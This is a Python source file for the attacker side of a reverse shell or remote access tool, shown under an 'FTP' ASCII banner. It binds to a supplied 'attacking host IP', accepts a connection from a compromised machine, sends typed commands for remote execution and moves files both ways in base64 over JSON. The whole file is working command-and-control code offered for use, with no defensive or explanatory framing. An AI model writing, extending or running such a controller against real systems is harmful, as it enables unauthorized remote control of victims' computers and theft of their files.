#!/usr/bin/python3
"""A simple listener script.
   Uses Python 3.8"""

import optparse
import base64
import socket
import json




print(r"""FFFFFFFFFFFFFFFFFFFFFFTTTTTTTTTTTTTTTTTTTTTTTPPPPPPPPPPPPPPPPP   
F::::::::::::::::::::FT:::::::::::::::::::::TP::::::::::::::::P  
F::::::::::::::::::::FT:::::::::::::::::::::TP::::::PPPPPP:::::P 
FF::::::FFFFFFFFF::::FT:::::TT:::::::TT:::::TPP:::::P     P:::::P
  F:::::F       FFFFFFTTTTTT  T:::::T  TTTTTT  P::::P     P:::::P
  F:::::F                     T:::::T          P::::P     P:::::P
  F::::::FFFFFFFFFF           T:::::T          P::::PPPPPP:::::P 
  F:::::::::::::::F           T:::::T          P:::::::::::::PP  
  F:::::::::::::::F           T:::::T          P::::PPPPPPPPP    
  F::::::FFFFFFFFFF           T:::::T          P::::P            
  F:::::F                     T:::::T          P::::P            
  F:::::F                     T:::::T          P::::P            
FF:::::::FF                 TT:::::::TT      PP::::::PP          
F::::::::FF                 T:::::::::T      P::::::::P          
F::::::::FF                 T:::::::::T      P::::::::P          
FFFFFFFFFFF                 TTTTTTTTTTT      PPPPPPPPPP""") 
print()
print()
print()











def get_arguments():
    """Get user supplied arguments from terminal."""
    parser = optparse.OptionParser()

    # arguments
    parser.add_option('-l', '--local', dest='local_ip', help='Attacking host IP.')
    parser.add_option('-p', '--port', dest='port', type="int", help='Port to connect to.')

    (options, arguments) = parser.parse_args()

    return options


options = get_arguments()


class Listener:
    def __init__(self, local_ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((local_ip, port))
        listener.listen(0)
        print('[+] Waiting for incoming connections...')
        self.connection, address = listener.accept()
        print(f'[+] Connection from {str(address)}.')

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b''
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)

        if command[0] == 'exit':
            self.connection.close()
            exit()

        return self.reliable_receive()

    def write_file(self, path, contents):
        with open(path, 'wb') as file:
            file.write(base64.b64decode(contents))
        return '[+] Download successful...'

    def read_file(self, path):
        with open(path, 'rb') as file:
            return base64.b64encode(file.read()).decode()

    def run(self):
        while True:
            command = input('>> ')
            command = command.split(' ')

            if command[0] == 'upload':
                file_content = self.read_file(command[1])
                command.append(file_content)

            result = self.execute_remotely(command)

            if command[0] == 'download' and '[-] Error' not in result:
                result = self.write_file(command[1], result)

            print(result)


my_listener = Listener(options.local_ip, options.port)
my_listener.run()